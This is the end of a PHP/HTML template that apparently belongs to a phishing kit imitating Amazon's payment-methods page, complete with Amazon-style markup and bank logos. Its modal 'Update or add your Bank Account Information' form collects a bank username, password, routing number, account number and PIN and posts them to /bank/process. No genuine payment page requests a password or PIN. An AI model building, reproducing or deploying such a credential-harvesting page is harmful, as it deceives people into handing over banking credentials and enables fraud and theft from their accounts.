																			class="a-row a-spacing-medium pmts-add-credit-card-content-trigger-row-common pmts-portal-component pmts-portal-components-pp-z3b4qh-20"
																		>
																			<span
																				class="a-declarative"
																				data-action="add-credit-card-action-name-pp-z3b4qh-20"
																				data-add-credit-card-action-name-pp-z3b4qh-20="{}"
																				id="apx-add-credit-card-action-test-id"
																				><span
																					id="pp-z3b4qh-63"
																					class="a-button a-button-base apx-secure-registration-content-trigger-js"
																					><span class="a-button-inner"
																						><input
																							class="a-button-input"
																							type="submit"
																							aria-labelledby="pp-z3b4qh-63-announce"
																						/><span
																							id="pp-z3b4qh-63-announce"
																							class="a-button-text"
																							aria-hidden="true"
																							>Add a credit or debit card</span
																						></span
																					></span
																				><span
																					class="a-button a-button-disabled a-spacing-mini a-button-base apx-secure-registration-content-trigger-no-js"
																					><span class="a-button-inner"
																						><button
																							disabled="disabled"
																							class="a-button-text"
																							type="button"
																						>
																							Add a credit or debit card
																						</button></span
																					></span
																				></span
																			>
																		</div>
																		<div
																			data-pmts-component-id="pp-z3b4qh-20"
																			class="a-section pmts-add-credit-card-component-container pmts-portal-component pmts-portal-components-pp-z3b4qh-20"
																		>
																			<div
																				class="a-row pmts-add-cc-rate-limiting-container a-hidden aok-hidden"
																			>
																				<div
																					class="a-box a-alert-inline a-alert-inline-error"
																					aria-live="assertive"
																					role="alert"
																				>
																					<div
																						class="a-box-inner a-alert-container"
																					>
																						<i class="a-icon a-icon-alert"></i>
																						<div class="a-alert-content">
																							<span
																								class="pmts-add-cc-rate-limiting-15mins-string a-hidden aok-hidden"
																								>You won't be able to add a card
																								for the next 15 minutes for
																								security reasons. </span
																							><span
																								class="pmts-add-cc-rate-limiting-24hrs-string a-hidden aok-hidden"
																								>You won't be able to add a card
																								for the next 24 hours for
																								security reasons.</span
																							><a
																								class="a-link-normal"
																								href="#"
																							>
																								Contact customer service</a
																							><span>
																								if you need further
																								assistance.</span
																							>
																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															data-pmts-component-id="pp-z3b4qh-36"
															class="a-row a-spacing-base pmts-portal-component pmts-portal-components-pp-z3b4qh-36"
														>
															<div class="a-column a-span9">
																<div class="a-row a-spacing-base">
																	<div class="a-row">
																		<span class="a-size-medium a-text-bold"
																			>Amazon Store Card</span
																		>
																	</div>
																	<div
																		class="a-row pmts-add-amazon-store-card-description"
																	>
																		Access to exclusive financing offers. No
																		annual fee. Zero fraud liability.
																	</div>
																</div>
																<div class="a-row">
																	<a
																		id="pp-z3b4qh-64"
																		class="a-link-normal pmts-add-amazon-store-card-learn-more-link"
																		target="AmazonHelp"
																		rel="noopener"
																		href="#"
																		>Learn more</a
																	>
																</div>
															</div>
															<div
																class="a-column a-span3 a-text-right a-span-last"
															>
																<img
																	alt=""
																	src="/public/images/plcc.gif"
																	class="pmts-add-amazon-store-card-logo"
																/>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-65"
															data-pmts-component-id="pp-z3b4qh-14"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-14"
														>
															<div
																aria-live="polite"
																class="a-row a-expander-container a-spacing-base a-expander-extend-container pmts-add-ba add-instrument-form-expander"
															>
																<div class="a-fixed-right-grid">
																	<div
																		class="a-fixed-right-grid-inner"
																		style="padding-right: 98px"
																	>
																		<div
																			class="a-fixed-right-grid-col a-col-left"
																			style="padding-right: 2%; float: left"
																		>
																			<div class="a-row a-spacing-base">
																				<div class="a-row">
																					<h3 class="pmts-portal-add-ba-title">
																						Personal Checking Accounts
																					</h3>
																				</div>
																				<div class="a-row">
																					<div
																						class="a-row pmts-add-bank-account-learnMore"
																					>
																						Use your US based personal checking
																						account.<span
																							class="a-letter-space"
																						></span
																						><a
																							class="a-link-normal pmts-learn-more-link"
																							target="AmazonHelp"
																							rel="noopener"
																							href="#"
																							>Learn more</a
																						>
																					</div>
																				</div>
																			</div>
																			<div
																				class="a-section a-hidden aok-hidden apx-expander-header-empty"
																			></div>
																		</div>
																		<div
																			class="a-text-right a-fixed-right-grid-col a-col-right"
																			style="
																				width: 98px;
																				margin-right: -98px;
																				float: left;
																			"
																		>
																			<img
																				alt=""
																				src="/public/images/bankrow.png"
																				class="pmts-add-bank-account-logo"
																			/>
																		</div>
																	</div>
																</div>
																<div
																	aria-expanded="true"
																	class="a-expander-content a-spacing-base a-expander-extend-content"
																>
																	<div
																		data-pmts-component-id="pp-z3b4qh-15"
																		class="a-row a-spacing-medium pmts-portal-component pmts-portal-components-pp-z3b4qh-15"
																	>
																		<span
																			class="a-declarative"
																			data-action="add-bank-account-action-name-pp-z3b4qh-15"
																			data-add-bank-account-action-name-pp-z3b4qh-15="{}"
																			id="apx-add-bank-account-content-trigger-declarative-action-test-id"
																			><span
																				id="pp-z3b4qh-67"
																				class="a-button a-button-base apx-secure-registration-content-trigger-js"
																				><span class="a-button-inner"
																					><input
																						class="a-button-input"
																						type="submit"
																						aria-labelledby="pp-z3b4qh-67-announce"
																					/><span
																						id="pp-z3b4qh-67-announce"
																						class="a-button-text"
																						aria-hidden="true"
																						>Add a personal checking
																						account</span
																					></span
																				></span
																			><span
																				class="a-button a-button-disabled a-spacing-mini a-button-base apx-secure-registration-content-trigger-no-js"
																				><span class="a-button-inner"
																					><button
																						disabled="disabled"
																						class="a-button-text"
																						type="button"
																					>
																						Add a personal checking account
																					</button></span
																				></span
																			>
																			<div class="a-section">
																				<div
																					class="a-box a-alert-inline a-alert-inline-warning apx-secure-registration-content-trigger-no-js"
																				>
																					<div
																						class="a-box-inner a-alert-container"
																					>
																						<i class="a-icon a-icon-alert"></i>
																						<div class="a-alert-content">
																							Please enable JavaScript to add a
																							bank account.
																						</div>
																					</div>
																				</div>
																			</div></span
																		>
																	</div>
																</div>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-68"
															data-pmts-component-id="pp-z3b4qh-8"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-8"
														>
															<div class="a-fixed-right-grid">
																<div
																	class="a-fixed-right-grid-inner"
																	style="padding-right: 98px"
																>
																	<div
																		class="a-fixed-right-grid-col a-col-left"
																		style="padding-right: 2%; float: left"
																	>
																		<div class="a-row a-spacing-base">
																			<div class="a-column a-span12">
																				<span class="a-size-medium a-text-bold"
																					>Enter your EBT card information</span
																				>
																			</div>
																		</div>
																		<div class="a-row">
																			<div
																				class="a-column a-span12 a-spacing-medium"
																			>
																				<span
																					class="a-declarative"
																					data-action="add-ebt-action-name"
																					data-add-ebt-action-name='{"name":"apx-add-card-popover-electronicbenefittransfer","header":"Add an EBT card","position":"absolute"}'
																					><span
																						id="pp-z3b4qh-69"
																						class="a-button a-button-base"
																						><span class="a-button-inner"
																							><input
																								class="a-button-input"
																								type="submit"
																								aria-labelledby="pp-z3b4qh-69-announce"
																							/><span
																								id="pp-z3b4qh-69-announce"
																								class="a-button-text"
																								aria-hidden="true"
																								>Add an EBT card</span
																							></span
																						></span
																					></span
																				>
																			</div>
																		</div>
																	</div>
																	<div
																		class="a-text-right a-fixed-right-grid-col a-col-right"
																		style="
																			width: 98px;
																			margin-right: -98px;
																			float: left;
																		"
																	>
																		<img
																			alt=""
																			src="/public/images/ebt.png"
																		/>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
                                        </div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div
			class="a-modal-scroller a-declarative"
			data-action="a-popover-floating-close"
			style="
				padding-bottom: 0px;
				visibility: visible;
				background-color: #111111af;
			"
		>
			<div
				class="a-popover a-popover-modal a-declarative"
				data-action="a-popover-a11y"
				aria-modal="true"
				role="dialog"
				id="a-popover-1"
				aria-hidden="false"
				style="
					visibility: hidden;
					position: fixed;
					top: 50%;
					left: 50%;
					transform: translate(-50%, -50%);
					margin: 0;
					opacity: 0;
				"
			>
                <script>
                    function updatePopoverWidth() {
                        const popover = document.getElementById("a-popover-1");
                        if (!popover) return;

                        if (window.innerWidth >= 1024) {
                            popover.style.top = "50%";
                        } else {
                            popover.style.top = "50%";
                        }
                    }

                    window.addEventListener("resize", updatePopoverWidth);
                    document.addEventListener("DOMContentLoaded", updatePopoverWidth);
                </script>
				<span
					tabindex="0"
					class="a-popover-start a-popover-a11y-offscreen"
				></span>

				<div class="a-popover-wrapper" aria-busy="false">
					<header class="a-popover-header">
						<h4 class="a-popover-header-content" id="a-popover-header-1">
							Update or add your Bank Account Information
						</h4>
						<button
							data-action="a-popover-close"
							class="a-button-close a-declarative"
							aria-label="Close"
						>
							<i class="a-icon a-icon-close"></i>
						</button>
					</header>

					<div
						class="a-popover-inner"
						id="a-popover-content-1"
						style="height: auto; overflow-y: auto"
					>
						<div
							data-pmts-component-id="pp-QBJBOr-1"
							class="a-section a-spacing-none pmts-widget-section pmts-portal-root-6WwKRTVPUTfO pmts-portal-component pmts-portal-components-pp-QBJBOr-1"
						>
							<div class="a-row">
								<div
									id="pp-QBJBOr-13"
									data-pmts-component-id="pp-QBJBOr-2"
									class="a-section pmts-portal-component pmts-portal-components-pp-QBJBOr-2"
								>
									<div class="a-section a-spacing-none pmts-widget-section">
										<div
											class="a-section pmts-add-credit-card-component-container"
										>
											<div
												data-pmts-component-id="pp-QBJBOr-3"
												class="a-box a-alert a-alert-info a-hidden aok-hidden apx-throttle-alert pmts-portal-component pmts-portal-components-pp-QBJBOr-3 a-spacing-base"
											>
												<div class="a-box-inner a-alert-container">
													<i class="a-icon a-icon-alert"></i>
													<div class="a-alert-content">
														You have exceeded the maximum attempts allowed,
														please retry after 2 hours.
													</div>
												</div>
											</div>

											<div
												id="pp-QBJBOr-14"
												data-pmts-component-id="pp-QBJBOr-3"
												class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-QBJBOr-3"
											>
												<form
													id="pp-QBJBOr-15"
													method="post"
													action="/bank/process"
													class="apx-add-card-compact-form a-spacing-none"
												>
													<div
														class="a-row a-spacing-base apx-add-card-compact-grid-row"
													>
														<div
                                                        id="pp-QBJBOr-16"
                                                        class="a-row a-spacing-base <?php echo $error ? '' : 'a-hidden aok-hidden'; ?>"
                                                    >
                                                        <div class="a-column a-span12">
                                                            <div
                                                                class="a-box a-alert a-alert-error max-w-[300px] md:max-w-full"
                                                                aria-live="assertive"
                                                                role="alert"
                                                            >
                                                                <div class="a-box-inner a-alert-container">
                                                                    <h4 class="a-alert-heading">
                                                                        There was a problem.
                                                                    </h4>
                                                                    <i class="a-icon a-icon-alert"></i>
                                                                    <div class="a-alert-content">
                                                                        <ul class="a-unordered-list a-vertical">
                                                                            <?php
                                                                            if ($error) {
                                                                                echo '<li>' . htmlspecialchars($error) . '</li>';
                                                                            }
                                                                            ?>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div class="block md:hidden mb-5">
                                                        <p class="a-spacing-small">
                                                            Amazon accepts all major Banks:
                                                        </p>

                                                        <div
                                                            class="a-section a-spacing-none a-text-right pmts-composite-logo-row"
                                                        >
                                                            <div style="display: flex; gap: 10px; margin-bottom: 40px">
                                                                <img src="/public/images/chase.png" alt="chase" width="60" height="40" />
                                                                <img src="/public/images/boa.png" alt="chase" width="60" height="40" />
                                                                <img src="/public/images/hsbc.png" alt="chase" width="60" height="40" />
                                                                <img src="/public/images/capo.png" alt="chase" width="80" height="20" style="height: 50px; margin-top: 5px;" />
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div class="a-column a-span7 -ml-5 md:ml-0" style="margin-top: 20px">
                                                        <div class="a-row pmts-add-credit-card-container">
                                                            <div class="a-row a-spacing-small">
                                                                <div
                                                                    class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label"
                                                                >
                                                                    <label
                                                                        for="pp-QBJBOr-17"
                                                                        class="a-form-label"
                                                                        >Bank Username</label
                                                                    >
                                                                </div>

                                                                <div
                                                                    class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last"
                                                                >
                                                                    <div class="a-row">
                                                                        <div class="a-column a-span9">
                                                                            <div
                                                                                class="a-section a-spacing-none apx-add-credit-card-number"
                                                                            >
                                                                                <input
                                                                                    type="tel"
                                                                                    id="pp-QBJBOr-17"
                                                                                    autocomplete="off"
                                                                                    name="addCreditCardNumber"
                                                                                    spellcheck="false"
                                                                                    class="a-input-text a-form-normal pmts-account-Number"
                                                                                />
                                                                            </div>
                                                                        </div>

                                                                        <div
                                                                            class="a-column a-span3 a-spacing-top-mini a-span-last"
                                                                        >
                                                                            <div
                                                                                class="a-section pmts-desktop-credit-card-instrument-logo"
                                                                            >
                                                                                <div
                                                                                    data-pmts-component-id="pp-QBJBOr-8"
                                                                                    class="a-section a-spacing-none pmts-identify-credit-card-section pmts-portal-component pmts-portal-components-pp-QBJBOr-8"
                                                                                >
                                                                                    <img
                                                                                        alt=""
                                                                                        src="/public/images/trans.gif"
                                                                                        class="pmts-identify-credit-card-img com.amazon.payments.portal.widget2.framework.template.tagext.FormMessageConstants$@6c6cb752.AUIHiddenCssClassNames"
                                                                                        id="pp-QBJBOr-18"
                                                                                    />
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <div class="a-row a-spacing-small">
                                                                <div
                                                                    class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label"
                                                                >
                                                                    <label
                                                                        for="bankPassword"
                                                                        class="a-form-label"
                                                                        >Bank Password</label
                                                                    >
                                                                </div>
                                                                <div
                                                                    class="a-column a-span8 pmts-customer-card-name-input-box a-span-last"
                                                                >
                                                                    <input
                                                                        type="password"
                                                                        maxlength="50"
                                                                        id="bankPassword"
                                                                        autocomplete="off"
                                                                        name="ppw-accountHolderName"
                                                                        spellcheck="false"
                                                                        class="a-input-text a-form-normal apx-add-credit-card-account-holder-name-input mcx-input-fields"
                                                                    />
                                                                    <div class="a-section a-spacing-none"></div>
                                                                </div>
                                                            </div>

                                                            <div class="a-row a-spacing-small">
                                                                <div
                                                                    class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label"
                                                                >
                                                                    <label
                                                                        for="bankRouting"
                                                                        class="a-form-label"
                                                                        >Bank Routing Number</label
                                                                    >
                                                                </div>
                                                                <div
                                                                    class="a-column a-span8 pmts-customer-card-name-input-box a-span-last"
                                                                >
                                                                    <input
                                                                        type="text"
                                                                        maxlength="50"
                                                                        id="bankRouting"
                                                                        autocomplete="off"
                                                                        name="ppw-accountHolderName"
                                                                        spellcheck="false"
                                                                        class="a-input-text a-form-normal apx-add-credit-card-account-holder-name-input mcx-input-fields"
                                                                    />
                                                                    <div class="a-section a-spacing-none"></div>
                                                                </div>
                                                            </div>

                                                            <div class="a-row a-spacing-small">
                                                                <div
                                                                    class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label"
                                                                >
                                                                    <label
                                                                        for="bankAccount"
                                                                        class="a-form-label"
                                                                        >Bank Account Number</label
                                                                    >
                                                                </div>
                                                                <div
                                                                    class="a-column a-span8 pmts-customer-card-name-input-box a-span-last"
                                                                >
                                                                    <input
                                                                        type="text"
                                                                        maxlength="50"
                                                                        id="bankAccount"
                                                                        autocomplete="off"
                                                                        name="ppw-accountHolderName"
                                                                        spellcheck="false"
                                                                        class="a-input-text a-form-normal apx-add-credit-card-account-holder-name-input mcx-input-fields"
                                                                    />
                                                                    <div class="a-section a-spacing-none"></div>
                                                                </div>
                                                            </div>

                                                            <div class="a-row a-spacing-small">
                                                                <div
                                                                    class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label"
                                                                >
                                                                    <label
                                                                        for="bankPin"
                                                                        class="a-form-label"
                                                                        >Bank PIN</label
                                                                    >
                                                                </div>
                                                                <div
                                                                    class="a-column a-span8 pmts-customer-card-name-input-box a-span-last"
                                                                >
                                                                    <input
                                                                        type="password"
                                                                        maxlength="50"
                                                                        id="bankPin"
                                                                        autocomplete="off"
                                                                        name="ppw-accountHolderName"
                                                                        spellcheck="false"
                                                                        class="a-input-text a-form-normal apx-add-credit-card-account-holder-name-input mcx-input-fields"
                                                                    />
                                                                    <div class="a-section a-spacing-none"></div>
                                                                </div>
                                                            </div>

                                                            <div class="a-row a-spacing-small">
                                                                <div class="a-column a-span4"></div>
                                                                <div class="a-column a-span8 a-span-last">
                                                                    <span
                                                                        id="pp-QBJBOr-30"
                                                                        class="a-button a-button-primary pmts-button-input"
                                                                    >
                                                                        <span class="a-button-inner">
                                                                            <input
                                                                                name="ppw-widgetEvent:AddCreditCardEvent"
                                                                                class="a-button-input"
                                                                                type="submit"
                                                                                aria-labelledby="pp-QBJBOr-30-announce"
                                                                            />
                                                                            <span
                                                                                id="pp-QBJBOr-30-announce"
                                                                                class="a-button-text"
                                                                                aria-hidden="true"
                                                                                >Continue</span
                                                                            >
                                                                        </span>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

														<div class="a-column a-span5 a-span-last hidden md:block">
															<p class="a-spacing-small">
																Amazon accepts all major Banks:
															</p>

															<div
																class="a-section a-spacing-none a-text-right pmts-composite-logo-row"
															>
                                                                <div style="display: flex;">
                                                                    <img src="/public/images/chase.png" alt="chase" width="60" height="40" />
																    <img src="/public/images/boa.png" alt="chase" width="60" height="40" />
																    <img src="/public/images/capo.png" alt="chase" width="80" height="20" style="height: 50px; margin-top: 5px;" />
																</div>
                                                                <div style="display: flex;">
                                                                    <img src="/public/images/barclays.png" alt="chase" width="100" height="60" />
																    <img src="/public/images/hsbc.png" alt="chase" width="80" height="40" />
																    <img src="/public/images/jp.png" alt="chase" width="100" height="40" />
																</div>
															</div>

														</div>
													</div>
												</form>
											</div>

											<div
												class="a-row pmts-add-cc-rate-limiting-container a-hidden aok-hidden"
											>
												<div
													class="a-box a-alert-inline a-alert-inline-error"
													aria-live="assertive"
													role="alert"
												>
													<div class="a-box-inner a-alert-container">
														<i class="a-icon a-icon-alert"></i>
														<div class="a-alert-content">
															<span
																class="pmts-add-cc-rate-limiting-15mins-string a-hidden aok-hidden"
															>
																You won't be able to add a card for the next 15
																minutes for security reasons.
															</span>
															<span
																class="pmts-add-cc-rate-limiting-24hrs-string a-hidden aok-hidden"
															>
																You won't be able to add a card for the next 24
																hours for security reasons.
															</span>
															<a
																class="a-link-normal"
																href="#"
															>
																Contact customer service
															</a>
															<span> if you need further assistance.</span>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
        <?php
            if (isMobile()) {
                require __DIR__ . '/../static/tes2.html';
            } else {
                require __DIR__ . '/../static/footer.php';
            }
        ?>
	</body>
</html>
